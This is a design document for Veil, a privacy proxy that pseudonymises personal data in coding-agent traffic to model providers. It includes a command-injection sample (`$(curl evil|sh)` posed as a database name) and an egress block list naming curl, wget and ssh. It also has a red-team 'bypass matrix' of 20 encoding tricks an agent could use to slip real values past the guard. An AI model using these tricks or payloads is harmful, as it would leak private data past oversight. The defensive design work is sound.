# Veil — Design

## Goal

The LLM sees a consistent fake world; the developer's machine keeps the real one.

```
                    real world                    │              fake world
                                                  │
  Postgres / SQLite ──seed──▶ ┌──────────────┐    │
  CSV, fixtures               │  Vault       │    │
                              │ value⇄token  │    │
                              └──────┬───────┘    │
                                     │            │
  Claude Code ──request (real)──▶ ┌──┴─────────┐ ─┼─ request (tokens) ──▶  api.anthropic.com
  (tools run   ◀─response (real)─ │ veil proxy │ ◀┼─ response (tokens) ──
   locally)                       └────────────┘  │
       ▲  PreToolUse: token→real (policy)         │
       └─ PostToolUse: real→token  (defence in depth, optional)
```

## Layers (defence in depth)

| # | Layer | Role | Fails |
|---|---|---|---|
| 0 | **Source** — masked DB role (pg_anonymizer) or masked dev copy | Best when the agent never needs real values | closed |
| 1 | **Proxy** — `ANTHROPIC_BASE_URL` (enforce with managed `allowedProviders`) | Enforcement: sees all context, both directions | closed |
| 2 | **Hooks** — PostToolUse redact / PreToolUse rehydrate | Backup; and for setups without a proxy | open |
| 3 | **Deny rules / sandbox** — raw dumps, `.env`, `data/` | Remove what never needs to be read | closed |

## Core engine

### Tokens
- `code = base32(HMAC‑SHA256(secret, group or kind‖value))[:4]`, alphabet without look‑alikes.
  - Deterministic → the same value always gets the same token → **byte‑stable history → prompt cache hits**.
  - Keyed → the provider can't dictionary‑attack tokens back to emails (unlike plain hashes).
  - Team‑shared `secret` → identical tokens on every machine → shareable bug reports ("user_cq5f fails").
  - Collision → retry with `#attempt` and widen the code; vault enforces uniqueness.
- **Format‑preserving, obviously‑fake renderings** so validators/tests keep working:

  | kind | token |
  |---|---|
  | username | `user_cq5f` |
  | email | `user_cq5f@example.test` (RFC 6761 reserved) |
  | name / first / last | `First_Cq5f Last_Cq5f` / `First_Cq5f` / `Last_Cq5f` (full = first + " " + last) |
  | 2nd value, same person | `user_cq5f_2`, `user_cq5f+2@example.test`, `Cq5f Example Street 2` |
  | phone | `+1-270-555-0131` (NANP fictional 555‑01xx) |
  | ipv4 | `203.0.113.196` (RFC 5737 documentation ranges) |
  | card / secret / other | `card_dusn`, `secret_x7k2`, `<kind>_<code>` |
- **Row grouping**: values seeded from the same record share the HMAC material (`users:42`), so one
  person gets one code across all their fields.
- Avoid `<PERSON_1>` / `[REDACTED_…]` (markdown/HTML mangling, tokenizer splits, ordinal instability).

### Detection (priority order; overlaps → longest span, then priority)
1. **Known values** — exact dictionary seeded from data sources (column classifier: `email`,
   `username|login|handle`, `first_name`, `name` only on person‑like tables, `phone`, `ip`…).
   Identifier boundaries so `alice_w` ≠ `malice_wrapper`. Min length + stopword list for short values.
   Prototype: one regex alternation; production: Aho–Corasick (pyahocorasick / Rust `aho-corasick`).
2. **Patterns** — email, phone (separator required), public IPv4 only, cards (Luhn), secrets
   (AWS, `sk-`, `ghp_`, Slack, JWT). Production: adopt a checksum‑validated, false‑positive‑tested set.
3. **NER (optional, `veil[ner]`, `--ner`)** — GLiNER-PII edge (46 MB quantised ONNX, ~15 ms/row) on free
   text only (messages, tool results), never system prompts/tool schemas/`<system-reminder>`s; labels
   person/email/phone/address only; product-name allowlist; cached per string (deterministic, cache-safe);
   its guesses never become guard needles.
- Allowlist reserved domains (`example.com`, `*.test`, `*.invalid`), private/loopback IPs.
- **Existing tokens are never re‑redacted** (idempotency; required for history stability).

### Vault (encrypted)
SQLite under `~/.veil` (0600), schema v2: real values and groups AES-256-GCM-encrypted, each bound to
its token as associated data (rows can't be swapped); rows found by a keyed hash of (kind, value);
`known.enc` holds the encrypted seed dictionary. Two keys in the macOS Keychain (service `veil`):
`vault-key` (never leaves the machine) and `token-secret` (share it for team-identical tokens).
`VEIL_VAULT_KEY` / `VEIL_TOKEN_SECRET` env for CI/Linux; 0600 key files as a warned fallback.
Keychain items are created via `security -i` on stdin (keys never in argv/`ps`). v1 plaintext state
is migrated and `VACUUM`ed. Tampering or a wrong key fails closed (`InvalidTag`).

## Proxy transforms (Anthropic Messages)

**Request (machine → model):** **default-deny** — redact every string in every top-level field
except pure config (`model`, `max_tokens`, `stream`, `thinking`, `tool_choice`, `output_config`, …).
Claude Code sends PII outside `system`/`messages` (e.g. `safeguards[].classifier_context.home_dir`).
Inside `system`/`messages`: `text`, `tool_result`, assistant `tool_use.input`, documents, unknown blocks. Leave
`thinking`/`redacted_thinking` (signed; only ever contain tokens) and images untouched. Don't touch
headers or non‑content fields. Because we rehydrated tool inputs on a previous turn, Claude Code sends
real values back in history; re‑redaction maps them to the *same* tokens → identical bytes.

**Outbound guard (after redaction, before forwarding):** structure-blind second pass over every
string in the final body: all real values veil knows, in plain + encoded forms (URL, JSON `\u`,
NFD, base64 at 3 alignments), plus pattern PII. Repairs in place (value → token); a hit inside a
signed thinking block can't be repaired → request blocked (`400`, `x-should-retry: false`). Audit
lines carry field path, kind and token, never the value. Exists because both mock-test leaks were
"didn't look there" bugs.

**Escaped output:** the guard also checks decoded views of each string (line continuations, sed `l`
`$` markers, octal / `\x` / `\u` escapes); a real value visible only after decoding means the whole
string is withheld (`[veil: output withheld …]`). Byte-dump commands are not run at all (below).
Real values inside model-written thinking are reported but allowed: the provider wrote them, and
signed blocks can't be edited — such a hit means an earlier leak to investigate.

**Pseudonym notice:** agent requests get one static system block telling the model pseudonyms are
opaque and must be used whole (real models grep/LIKE on token fragments). Static text keeps caching intact.

**Matching:** Aho–Corasick for known values and guard needles (Python `re` alternation of thousands
of literals cost ~400 ms per Claude Code request; now ≤60 ms). Known emails match case-insensitively.

**Rehydrating into commands (data → code boundary):** Bash commands are rehydrated by a quote-aware
scanner: each real value is escaped for where its token sits — unquoted (`shlex.quote`), `'…'`,
`"…"`, or an SQL `'…'` literal inside a double-quoted string (`sqlite3 db "… where name = 'TOKEN'"`:
`'` doubled, then shell-escaped). A seeded name like `$(curl evil|sh)` or `O'Brien` stays data.
Without this, 23 of 35 injection tests fail.

**Bypass matrix (`python -m veil.redteam`, regression-tested):** 20 one-command transforms an agent can
apply (octal/hex/base64 dumps, repr/JSON escapes, rev, rot13, upper-casing, one char per line, spaced
letters, `cut` mid-value, SQL `hex()`/`upper()`/`replace()`/`substr()`/`unicode()`, URL-encoding). All 20
contained: byte dumps blocked by command policy; the guard withholds message content whose
case/space/reversal/rot13/hex/URL/escape-normalised view contains a seeded value of ≥ 8 chars, replaces
value heads/tails cut at line boundaries with `[veil:partial]`, and seeds email local parts as their own
values (`leonekohler at surfeu dot de`). The audit oracle decodes all of these (plus char codes) —
an earlier oracle without them reported 15/20 when the truth was 9/20.

**Scale (≈ 40k seeded values from 4 stores):** redaction ≈ 8 ms, guard ≈ 11 ms per 67k-char Claude Code
request; guard index split into a seeded part (built once, 0.5 s) and a small pattern-found part.
Standalone first/last names and usernames that are lower-case dictionary words (`Code`, `Read`, `Mark`)
are not seeded alone (they rewrote "Claude Code" and the `Read` tool name); full names still are. The
guard never touches structural keys (`type`, `id`, tool names) and runs its heuristics only on messages.

**Response (model → machine):**
- `tool_use.input` → rehydrated per **sink policy**:

  | mode | tools | behaviour |
  |---|---|---|
  | full | Bash, Read, Grep, Glob, allowlisted MCP (e.g. DB) | all tokens → real |
  | preserve | Edit, MultiEdit, Write, NotebookEdit | locators (`file_path`, `old_string`) fully; content (`new_string`, `content`) only tokens whose real value **already exists in the target file** → new PII is never written into source/fixtures |
  | none | WebFetch, WebSearch, Agent, unknown tools; **Bash commands with egress** (curl, wget, ssh, git push…) | tokens stay tokens (fail‑safe; blocks prompt‑injection exfiltration of real data) |
  | notice | Bash using a **pseudonym fragment** (`LIKE '%ab12%'`) or a **byte dump** (`sed l`, `od`, `xxd`, `cat -v`, `base64`) | command replaced by an `echo` explaining why (fragments: cites the person's real tokens); Grep-tool fragments are expanded to the person's real values instead |
- assistant `text` → rehydrated for display (configurable `--show-tokens`).
- **Streaming**: text deltas are rehydrated with a hold‑back buffer of `max_token_len` chars (tokens
  split across deltas are restored; matching sees real neighbours on both sides); `input_json_delta`
  is buffered until `content_block_stop`, rehydrated as parsed JSON (correct escaping), emitted as one
  delta; pings/thinking/signatures/usage pass through immediately.
- `count_tokens`: request redacted, response passed through. Errors: bodies forwarded unmodified.
- Any redaction failure → 502, never forward raw.

## OpenAI-format adapters (same lens)

- **Chat Completions** (`/chat/completions`, `/v1/chat/completions`): message text/parts, tool results,
  assistant `tool_calls[].function.arguments` (a JSON *string*: parsed, redacted, re-serialised); `user`
  and unknown fields default-deny; notice inserted after the leading system messages (stable prefix).
  Streams: text via the shared hold-back (`stream.TextHold`); tool-call argument deltas buffered per call
  until `finish_reason`, then emitted whole after policy.
- **Responses** (`/v1/responses`, Codex): `instructions`, message items, `function_call` arguments,
  `function_call_output`, `custom_tool_call` (`apply_patch` → preserve over the files it touches; header
  paths made real), `local_shell_call`; **`reasoning` items (encrypted) untouched**. Streams: deltas,
  `*.done`, `output_item.done` and `response.completed` are rewritten consistently (one rehydration per item).
- Tool names are arbitrary in this world, so sinks are classified by name: shell/exec/terminal → Bash
  policy (string, `cmd`, or argv `["bash","-lc",script]`; plain argv gets substitution without escaping);
  read/search → full; write/edit/patch → preserve; `write_stdin` (keystrokes into a possibly-shell
  session) and unknown tools → no real values.

## Adoption

- `veil init PROJECT`: detects `*_DATABASE_URL`/`REDIS_URL`/`MONGODB_URI`… in `.env*`, SQLite files,
  fixtures/seeds dirs; seeds them (credentials masked in output); writes project-local
  `.claude/settings.local.json` (merged, idempotent, git-ignored): `env.ANTHROPIC_BASE_URL`, `NO_PROXY`,
  PreToolUse/PostToolUse veil hooks (absolute interpreter path); optional `--deny-env`.
- `veil service install|uninstall|status`: LaunchAgent `dev.veil.proxy` (RunAtLoad, KeepAlive), waits out
  `launchctl bootout`'s asynchrony before `bootstrap` (a real race we hit). `veil status` and
  `GET /veil/health` (counts only, never values).
- **Multi-process vault:** hooks and the long-running proxy share one SQLite vault (WAL). Each process
  loads rows added by others (`refresh()` by rowid) before allocating, on lookup misses, and at the start
  of every proxied request; allocation conflicts surface as `IntegrityError` and are retried. (Before this,
  a hook-allocated `card_…` token reached the developer un-rehydrated.)
- Hook latency ≈ 0.26 s per call with a 33k-value vault (fresh process); a future option is hooks that ask
  the running proxy instead.

## Cloud providers (Bedrock, Vertex)

Both carry Anthropic Messages bodies (+ `anthropic_version`, `anthropic_beta` body fields, passed as
config), so redaction is unchanged. Routing by path: Bedrock `/model/{id}/invoke[-with-response-stream]`,
`/count-tokens`; Vertex `.../publishers/anthropic/models/{m}:streamRawPredict|:rawPredict`.
Vertex streams SSE (existing StreamRewriter). **Bedrock streams binary
`application/vnd.amazon.eventstream`**: veil decodes frames (prelude/headers/payload, CRC32 checked),
rewrites the Anthropic event inside `{"bytes": base64(...)}`, re-encodes with fresh CRCs (validated
against botocore's decoder; real Claude Code parses it). Auth: clients skip their own signing
(`CLAUDE_CODE_SKIP_BEDROCK_AUTH` / `_VERTEX_AUTH`) and veil injects credentials **after** redaction —
a client SigV4 signature covers the body veil must change. Bedrock: `AWS_BEARER_TOKEN_BEDROCK` or SigV4
(botocore default credential chain); Vertex: `VEIL_VERTEX_TOKEN` or `gcloud auth print-access-token`.

## Teams

- `veil team export|join`: bundle = token secret + allowlist (scrypt + AES-GCM under a passphrase);
  the vault key never leaves a machine. Joining over a non-empty vault requires `--reset-vault`
  (tokens are re-derived deterministically from the new secret).
- `veil team allow`: team allowlist (values never treated as PII), applied to seeding and detection.
- `veil team managed-settings`: `managed-settings.d/50-veil.json` with managed `env.ANTHROPIC_BASE_URL`
  pinned + `allowedProviders: ["customEndpoint"]` (Claude Code admits only that exact endpoint;
  v2.1.285+), optional veil hooks via the stable `veil-hook` command, optional `allowManagedHooksOnly`.
  Installed by an admin into `/Library/Application Support/ClaudeCode/` or `/etc/claude-code/`.

## Fast hooks

`veil-hook pre|post` (stdlib only) forwards the hook event to the running proxy's
`/veil/hook/{pre,post}`: 39 ms vs 278 ms for an in-process hook with a 33k-value vault; falls back to
in-process when the proxy is down. The endpoint can rehydrate tokens, so it requires a per-install
secret (`~/.veil/hook.secret`, 0600, created at proxy start) and a loopback `Host` (DNS-rebinding guard).

## Linux

Keys in the Secret Service via `secret-tool` (secret on stdin); `veil service` writes a hardened
systemd user unit (`NoNewPrivileges`, `ProtectSystem=strict`, `ProtectHome=read-only` +
`ReadWritePaths=$VEIL_HOME`, 0600) and enables it with `systemctl --user`. Verified in a Debian
container: pip-installed wheel, GNOME Keyring via `dbus-run-session`, `systemd-analyze verify`.

## Packaging

Core deps: httpx, cryptography, pyahocorasick. Extras: `postgres`, `mysql`, `mongo`, `redis`,
`bedrock`, `ner`, `all`. Console scripts `veil`, `veil-hook`. Wheel 93 KB; sdist 97 KB. Homebrew formula
generated from `uv.lock` (uses Homebrew's `cryptography`; `service do` block for `brew services`).

## Hook mode
`veil hook post` → `updatedToolOutput` with every string redacted (keeps the tool's output shape).
`veil hook pre` → `updatedInput` rehydrated with the same sink policy. Cannot cover the user prompt or
system prompt, and fails open on schema mismatch → backup only.

```json
{ "hooks": {
  "PreToolUse":  [{ "matcher": "*", "hooks": [{ "type": "command", "command": "veil hook pre"  }] }],
  "PostToolUse": [{ "matcher": "*", "hooks": [{ "type": "command", "command": "veil hook post" }] }]
}}
```

## Threat model

- **Protects against:** provider‑side retention/logging/training exposure, transcripts shared with
  vendors, accidental leakage in prompts, prompt‑injected exfiltration via rehydrated web/egress calls.
- **Does not protect against:** a compromised local machine; real values in Claude Code's local
  transcript (rehydrated display); OTel/analytics that capture tool output before hooks
  (set `CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC=1`); re‑identification via quasi‑identifiers;
  PII in images; encoded forms not yet decoded.

## Roadmap

1. **MVP (prototype exists):** proxy + engine + SQLite seeding + hooks + tests. ✅
1b. **Outbound guard, encoded forms, `veil audit`, real-model run (DeepSeek), Aho–Corasick.** ✅
1d. **Hardening:** encrypted vault + Keychain, context-aware shell/SQL rehydration, bypass matrix
    20/20, scale fixes (dictionary-word filter, structural keys, split guard index). ✅
1c. **Seeders** (SQLite, Postgres, MySQL/MariaDB, MongoDB, Redis, fixture files, env), native labels,
    pg_anonymizer dictionary, FK/value grouping, fragment handling, optional NER, escape/byte-dump defence. ✅
    See `docs/DATABASES.md`.
2. Seeders still to do: SQL Server (native classifications), schema-from-code (ORM types), Elasticsearch,
   DynamoDB key segments, warehouses; `git log` authors; continuous re-seeding when the DB changes.
3. Leak‑test harness: canary values planted in DB/logs; run real agent sessions; assert no canary in
   upstream payloads (proxy logs payload hashes + "what the model saw" diff viewer).
4. ✅ done (see 1d). Still open: per-project vault namespaces, key rotation, team secret distribution.
5. Optional NER layer (Privacy Filter / GLiNER) for free text; quasi‑identifier warnings.
6. ✅ OpenAI Chat Completions + Responses adapters (Aider/Continue/SDK; Codex). Still open: Bedrock/Vertex
   formats; MCP DB server with masking.
7. ✅ `veil init` / `status` / `service`; ✅ team mode, managed-settings drop-in, Linux (systemd + Secret
   Service), Bedrock/Vertex, fast hooks, packaging (2026-10-20).
8. Open: publish a release (PyPI + Homebrew tap), Windows (Credential Manager, scheduled task),
   Microsoft Foundry / Claude Platform on AWS formats, real-cloud runs (needs AWS/GCP accounts).

## Open questions

- Should file writes ever get *new* real values (e.g. user explicitly asks to add a real admin email)?
  Proposed: explicit per‑session override, logged.
- Display of real values in the terminal: default on (UX) vs off (shoulder‑surfing, screen sharing).
- Short/common usernames (`bob`, `jordan`): recall vs breaking code identifiers — needs a corpus to tune.
